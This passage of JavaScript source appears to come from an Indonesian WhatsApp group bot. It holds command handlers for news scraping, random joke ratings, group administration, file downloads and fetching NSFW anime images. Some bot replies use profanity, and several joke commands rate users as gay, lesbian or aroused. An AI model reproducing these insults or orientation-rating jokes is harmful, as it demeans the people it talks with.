teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
BossRaehan.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : Raehan })
})
break
//════════════════════════════//
case 'daily-news':
if (isBan) throw (from)

DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
BossRaehan.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : Raehan })
})
break
//════════════════════════════//
case 'inews-news':
if (isBan) throw (from)

iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
anjay(teks) 
})
break
//════════════════════════════//
case 'okezone-news':
if (isBan) throw (from)

OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
BossRaehan.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : Raehan })
})
break
//════════════════════════════//
case 'sindo-news':
if (isBan) throw (from)

SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
anjay(teks) 
})
break
//════════════════════════════//
case 'tempo-news':
if (isBan) throw (from)

TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
BossRaehan.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : Raehan })
})
break
//════════════════════════════//
case 'antara-news':
if (isBan) throw (from)

AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
BossRaehan.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : Raehan })
})
break
//════════════════════════════//
case "kontan-news":
if (isBan) throw (from)

KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
BossRaehan.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : Raehan })
})
break
//════════════════════════════//
case "merdeka-news":
if (isBan) throw (from)

MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
BossRaehan.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : Raehan })
})
break
//════════════════════════════//
case "jalantikus-meme":
if (isBan) throw (from)

var res = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${res}`
teks += ""
BossRaehan.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : Raehan })
break
//════════════════════════════//
/*Random*/
 case 'apakah':
 if (isBan) throw (from)

if (!q) return anjay(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
BossRaehan.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: Raehan })
break
//════════════════════════════//
case 'bisakah':
if (isBan) throw (from)

if (!q) return anjay(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Aaokawpk','TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
BossRaehan.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: Raehan })
break
//════════════════════════════//
case 'bagaimanakah':
if (isBan) throw (from)

if (!q) return anjay(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
BossRaehan.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: Raehan })
break
//════════════════════════════//
case 'rate':
if (isBan) throw (from)

if (!q) return anjay(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const te = ra[Math.floor(Math.random() * ra.length)]
BossRaehan.sendMessage(from, { text: `Rate : ${q}\nJawaban : *${te}%*` }, { quoted: Raehan })
break
//════════════════════════════//
case 'gantengcek':
case 'cekganteng':
if (isBan) throw (from)

if (!q) return anjay(`Penggunaan ${command} Nama\n\nContoh : ${command} BossRaehan`)
const gan = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const teng = gan[Math.floor(Math.random() * gan.length)]
BossRaehan.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${teng}%*` }, { quoted: Raehan })
break
//════════════════════════════//
case 'cantikcek':
case 'cekcantik':
if (isBan) throw (from)

if (!q) return anjay(`Penggunaan ${command} Nama\n\nContoh : ${command} BossRaehan`)
const can = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const tik = can[Math.floor(Math.random() * can.length)]
BossRaehan.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${tik}%*` }, { quoted: Raehan })
break
//════════════════════════════//
case 'sangecek':
case 'ceksange':
case 'gaycek':
case 'cekgay':
case 'lesbicek':
case 'ceklesbi':
if (isBan) throw (from)

if (!q) return anjay(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
const sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
BossRaehan.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${sange}%*` }, { quoted: Raehan })
break
//════════════════════════════//
case 'kapankah':
if (isBan) throw (from)

if (!q) return anjay(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
BossRaehan.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: Raehan })
break
//════════════════════════════//
case 'wangy':
if (isBan) throw (from)

if (!q) return reply (`Contoh : .wangy BossRaehan`)
qq = q.toUpperCase()
awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
 anjay(awikwok)
break
//════════════════════════════//
case 'cekmati':
if (isBan) throw (from)

if (!q) return anjay(`Invalid!\n\nYg mau di cek siapa kontol?`)
predea = await axios.get(`https://api.agify.io/?name=${q}`)
anjay(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
break
//════════════════════════════//
//════════════════════════════//
//════════════════════════════//
case 'suitpvp': case 'suit': {
if (isBan) throw (from)

this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) anjay(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return anjay(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return anjay(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_
@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit
Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await BossRaehan.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) BossRaehan.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
//════════════════════════════//


//════════════════════════════//


//════════════════════════════//
case 'chat': {
if (isBan) throw (from)

if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
if (args[0] === 'mute') {
BossRaehan.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
} else if (args[0] === 'unmute') {
BossRaehan.chatModify({ mute: null }, m.chat, []).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
} else if (args[0] === 'archive') {
BossRaehan.chatModify({archive: true }, m.chat, []).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
} else if (args[0] === 'unarchive') {
BossRaehan.chatModify({ archive: false }, m.chat, []).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
} else if (args[0] === 'read') {
BossRaehan.chatModify({ markRead: true }, m.chat, []).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
} else if (args[0] === 'unread') {
BossRaehan.chatModify({ markRead: false }, m.chat, []).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
} else if (args[0] === 'delete') {
BossRaehan.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
}
break
//════════════════════════════//
case 'family100': {
if (isBan) throw (from)

if ('family100'+m.chat in _family100) {
anjay('Masih Ada Sesi Yang Belum Diselesaikan!')
throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
pesan: await BossRaehan.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
}
}
break
//════════════════════════════//
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
if (isBan) throw (from)

if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
anjay(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break
//════════════════════════════//
//════════════════════════════//
case 'mediafire': {
if (isBan) throw (from)

////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return  
if (!text) throw '*Enter a Link Query!*'
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*The link you provided is not valid*'
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return anjay('*File Over Limit* '+util.format(baby1))
const result4 = `*DOWNLOAD MEDIAFIRE*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}\n
_whoa wait zimbot processing..._

*𝗥𝗔𝗘𝗛𝗔𝗡 1986*`
anjay(`${result4}`)
BossRaehan.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : Raehan }).catch ((err) => anjay('*Failed to download File*'))
}
break
//════════════════════════════//
//════════════════════════════//
//════════════════════════════//
case 'react': {
 reactionMessage = {
react: {
text: '🇮🇩',
key: { remoteJid: from, fromMe: false, id: quoted.id }
}
}
BossRaehan.sendMessage(from, reactionMessage)
}
break
//════════════════════════════//
case 'join': {
if (!isCreator) return
if (isBan) throw (from)

if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let result = args[0].split('https://chat.whatsapp.com/')[1]
await BossRaehan.groupAcceptInvite(result).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
break
//════════════════════════════//
case 'leave': {
if (!isCreator) return
if (isBan) throw (from)

await BossRaehan.groupLeave(m.chat).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
break
//════════════════════════════//
case 'setexif': {
if (isBan) throw (from)

 if (isBan) throw (from)

 if (!text) throw `Example : ${prefix + command} packname|author`
global.packname = text.split("|")[0]
global.author = text.split("|")[1]
anjay(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
}
break
//════════════════════════════//
case 'kick': {
if (!isCreator) return
if (isBan) throw (from)

if (!m.isGroup) throw (from)
if (!isBotAdmins) throw (from)
if (!isAdmins) throw (from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await BossRaehan.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
break
//════════════════════════════//
case 'add': {
if (!isCreator) return
if (isBan) throw (from)

if (!m.isGroup) throw (from)
if (!isBotAdmins) throw (from)
if (!isAdmins) throw (from)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await BossRaehan.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
break
//════════════════════════════//
case 'promote': {
if (!isCreator) return
if (isBan) throw (from)

if (!m.isGroup) throw (from)
if (!isBotAdmins) throw (from)
if (!isAdmins) throw (from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await BossRaehan.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
break
//════════════════════════════//
case 'demote': {
if (!isCreator) return
if (isBan) throw (from)

if (!m.isGroup) throw (from)
if (!isBotAdmins) throw (from)
if (!isAdmins) throw (from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await BossRaehan.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
break
//════════════════════════════//
case 'block': {
if (!isCreator) return
if (isBan) throw (from)

let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await BossRaehan.updateBlockStatus(users, 'block').then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
break
//════════════════════════════//
case 'unblock': {
if (!isCreator) return
if (isBan) throw (from)

let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await BossRaehan.updateBlockStatus(users, 'unblock').then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
break
//════════════════════════════//
case 'setname': case 'setsubject': {
if (isBan) throw (from)

if (!m.isGroup) throw (from)
if (!isBotAdmins) throw (from)
if (!isAdmins) throw (from)
if (!text) throw 'Text ?'
await BossRaehan.groupUpdateSubject(m.chat, text).then((res) => (from)).catch((err) => anjay(jsonformat(err)))
}
break
//════════════════════════════//
case 'setdesc': case 'setdesk': {
if (isBan) throw (from)

if (isBan) throw (from)

if (!m.isGroup) throw (from)
if (!isBotAdmins) throw (from)
if (!isAdmins) throw (from)
if (!text) throw 'Text ?'
await BossRaehan.groupUpdateDescription(m.chat, text).then((res) => (from)).catch((err) => anjay(jsonformat(err)))
}
break
//════════════════════════════//
case 'nsfw': {
if (isBan) throw (from)

if (!m.isGroup) return anjay(mess.group)
if (!isBotAdmins) return anjay(mess.botAdmin)
if (!isAdmins && !isCreator) return anjay(mess.admin)
if (args[0] === "on") {
if (AntiNsfw) return anjay('Sudah Aktif')
ntnsfw.push(from)
anjay('Sukses Telah mengaktifkan Nsfw Di group Ini')
var groupe = await BossRaehan.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
BossRaehan.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya`, contextInfo: { mentionedJid : mems }}, {quoted: Raehan})
} else if (args[0] === "off") {
if (!AntiNsfw) return anjay('Sudah Non Aktif')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
anjay('Sukses Mematikan Nsfw di group ini')
} else {
const anuu = {
image:fs.readFileSync("./DataBoss/video/thumbnail.jpg"),
gifPlayback:false,
jpegThumbnail:Mthumb,
caption:  `Ketik Text Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan
\n\n*HELLO SANGEAN*\n\n
trap
gasm
nwaifu
hneko `,
}
BossRaehan.sendMessage(m.chat, anuu, `${global.botname}`, m)
}
}
break
case 'trap' :
if (isBan) throw (from)

if (!m.isGroup) return anjay(mess.group)

anjay(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)
 const trapbot = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
}
BossRaehan.sendMessage(m.chat, trapbot, { quoted: Raehan }).catch(err => {
 return('Error!')
})
break
case 'hentai-neko' :
case 'hneko' :
if (isBan) throw (from)

if (!m.isGroup) return anjay(mess.group)

 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 const hnekobot = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
}
BossRaehan.sendMessage(m.chat, hnekobot, { quoted: Raehan }).catch(err => {
 return('Error!')
})
break
case 'hentai-waifu' :
case 'nwaifu' :
if (isBan) throw (from)

if (!m.isGroup) return anjay(mess.group)

anjay(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 const nwaifubot = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
}
BossRaehan.sendMessage(m.chat, nwaifubot, { quoted: Raehan }).catch(err => {
 return('Error!')
})
break
case 'gasm':
if (isBan) throw (from)


anjay(mess.wait) 
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
 const wbuttsss = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
}
BossRaehan.sendMessage(m.chat, wbuttsss,{ quoted: Raehan }).catch(err => {
 return('Error!')
})
break
case 'buatgrup':
if (!isCreator) return
if (isBan) throw (from)

if (!q) return anjay(`*Contoh* :\n#buatgrup namagroup`)
let cret = await BossRaehan.groupCreate(args.join(" "), [])
let response = await BossRaehan.groupInviteCode(cret.id)
teks = `
╔══════[ 「 𝐂𝐑𝐄𝐀𝐓𝐄 𝐆𝐑𝐎𝐔𝐏 」 ]══════⊱
╠➤ ▸ 𝐍𝐚𝐦𝐞 : ${cret.subject}
╠➤ ▸ 𝐎𝐰𝐧𝐞𝐫 : @${cret.owner.split("@")[0]}
╠➤ ▸ 𝐓𝐢𝐦𝐞 : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
╠════[ 𝐋𝐈𝐍𝐊 𝐆𝐑𝐎𝐔𝐏 ]══════⊱
╠➤ https://chat.whatsapp.com/${response}
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱
`
anjay(teks)
break
case 'setppbot': {
if (!isCreator) return
if (isBan) throw (from)

(from)
if (!quoted) throw `𝐊𝐢𝐫𝐢𝐦/𝐑𝐞𝐩𝐥𝐲 𝐅𝐨𝐭𝐨 𝐃𝐞𝐧𝐠𝐚𝐧 𝐂𝐚𝐩𝐭𝐢𝐨𝐧 ${prefix + command}`
if (!/image/.test(mime)) throw `𝐊𝐢𝐫𝐢𝐦/𝐑𝐞𝐩𝐥𝐲 𝐅𝐨𝐭𝐨 𝐃𝐞𝐧𝐠𝐚𝐧 𝐂𝐚𝐩𝐭𝐢𝐨𝐧 ${prefix + command}`
if (/webp/.test(mime)) throw `𝐊𝐢𝐫𝐢𝐦/𝐑𝐞𝐩𝐥𝐲 𝐅𝐨𝐭𝐨 𝐃𝐞𝐧𝐠𝐚𝐧 𝐂𝐚𝐩𝐭𝐢𝐨𝐧 ${prefix + command}`
var media = await BossRaehan.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
const { generateProfilePicture } = require("./DataBoss/lib/myfunc")
var { img } = await generateProfilePicture(media)
await BossRaehan.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await BossRaehan.updateProfilePicture(botNumber, { url: media }) }
anjay(mess.success)
} catch { anjay('𝐆𝐚𝐠𝐚𝐥 𝐌𝐞𝐧𝐠𝐠𝐚𝐧𝐭𝐢 𝐅𝐨𝐭𝐨 𝐅𝐫𝐨𝐟𝐢𝐥') }
}
break



case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (isBan) throw (from)

if (!m.isGroup) throw mess.group

(from)
if (!quoted) throw `𝐊𝐢𝐫𝐢𝐦/𝐑𝐞𝐩𝐥𝐲 𝐅𝐨𝐭𝐨 𝐃𝐞𝐧𝐠𝐚𝐧 𝐂𝐚𝐩𝐭𝐢𝐨𝐧 ${prefix + command}`
if (!/image/.test(mime)) throw `𝐊𝐢𝐫𝐢𝐦/𝐑𝐞𝐩𝐥𝐲 𝐅𝐨𝐭𝐨 𝐃𝐞𝐧𝐠𝐚𝐧 𝐂𝐚𝐩𝐭𝐢𝐨𝐧 ${prefix + command}`
if (/webp/.test(mime)) throw `𝐊𝐢𝐫𝐢𝐦/𝐑𝐞𝐩𝐥𝐲 𝐅𝐨𝐭𝐨 𝐃𝐞𝐧𝐠𝐚𝐧 𝐂𝐚𝐩𝐭𝐢𝐨𝐧 ${prefix + command}`
let media = await BossRaehan.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
const { generateProfilePicture } = require("./DataBoss/lib/myfunc")
var { img } = await generateProfilePicture(media)
await BossRaehan.query({ tag: 'iq',attrs: { to: m.chat, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await BossRaehan.updateProfilePicture(m.chat, { url: media }) }
anjay(mess.success)
} catch { anjay('𝐆𝐚𝐠𝐚𝐥 𝐌𝐞𝐧𝐠𝐠𝐚𝐧𝐭𝐢 𝐅𝐨𝐭𝐨 𝐅𝐫𝐨𝐟𝐢𝐥') }
}
break
//════════════════════════════//
case 'tagall': {
if (isBan) throw (from)

if (!m.isGroup) throw (from)
let teks = `╔══════[ 𝐏𝐄𝐒𝐀𝐍 ]══════⊱\n╠➤ ${q ? q : 'kosong'}\n╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱\n\n\n\n\n`
for (let mem of participants) {
teks += `╔══════[ 𝐓𝐀𝐆 ]══════⊱\n╠➤ @${mem.id.split('@')[0]}\n╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱\n\n\n`
}
BossRaehan.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: Raehan })
}
break
//════════════════════════════//
case 'hidetag': {
if (isBan) throw (from)

if (!m.isGroup) throw (from)
if (!isBotAdmins) throw (from)
if (!isAdmins) throw (from)
BossRaehan.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: Raehan })
}
break
//════════════════════════════//
case 'style': case 'styletext': {
if (isBan) throw (from)
 // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
let { styletext } = require('./DataBoss/lib/scraper')
if (!text) throw '𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐐𝐮𝐞𝐫𝐲 𝐓𝐞𝐱𝐭𝐧𝐲𝐚!'
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `⭔ *${i.name}* : ${i.result}\n\n`
}
anjay(teks)
}
break
//════════════════════════════//
//VOICE VN


case 'bang': {
if (from)
 moko = fs.readFileSync('./DataBoss/sound/bang.mp3')
 BossRaehan.sendMessage(m.chat, {audio: moko, mimetype: 'audio/mpeg', ptt:true }, {quoted:Raehan})
 }
 
 break
case 'p': {
if (from)
 moko = fs.readFileSync('./DataBoss/sound/p.mp3')
 BossRaehan.sendMessage(m.chat, {audio: moko, mimetype: 'audio/mpeg', ptt:true }, {quoted:Raehan})
 }

 break

case 'cangkem': {
if (from)
 moko = fs.readFileSync('./DataBoss/sound/cangkem.mp3')
 BossRaehan.sendMessage(m.chat, {audio: moko, mimetype: 'audio/mpeg', ptt:true }, {quoted:Raehan})
 }
 
 break
//════════════════════════════//
 case 'group': case 'grup': {
 if (isBan) throw (from)

if (!m.isGroup) throw (from)
if (!isBotAdmins) throw (from)
if (!isAdmins) throw (from)
if (args[0] === 'close'){
await BossRaehan.groupSettingUpdate(m.chat, 'announcement').then((res) => anjay(`Sukses Menutup Group`)).catch((err) => anjay(jsonformat(err)))
} else if (args[0] === 'open'){
await BossRaehan.groupSettingUpdate(m.chat, 'not_announcement').then((res) => anjay(`Sukses Membuka Group`)).catch((err) => anjay(jsonformat(err)))
} else {
const anmu = {
image:fs.readFileSync("./DataBoss/video/thumbnail.jpg"),
gifPlayback:false,
jpegThumbnail:Mthumb,
caption:  `𝐌𝐨𝐝𝐞 𝐆𝐫𝐨𝐮𝐩`,
}
BossRaehan.sendMessage(m.chat, anmu, `𝐌𝐨𝐝𝐞 𝐆𝐫𝐨𝐮𝐩`, BossRaehan.user.name, m)
 }
